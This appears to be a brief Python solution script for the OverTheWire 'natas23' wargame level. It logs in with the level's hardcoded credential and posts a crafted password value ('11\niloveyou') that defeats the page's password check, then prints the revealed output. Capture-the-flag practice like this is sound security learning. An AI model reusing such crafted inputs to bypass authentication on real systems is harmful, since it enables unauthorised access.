import requests
from bs4 import BeautifulSoup
url="http://natas23.natas.labs.overthewire.org"
auth_user="natas23"
auth_pass="qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj"

r=requests.post(url,auth=(auth_user,auth_pass),data={"passwd":"11\niloveyou","submit":"submit"})
soup= BeautifulSoup(r.text,features="lxml")

for par in soup.find_all('pre'):
    print(par.string)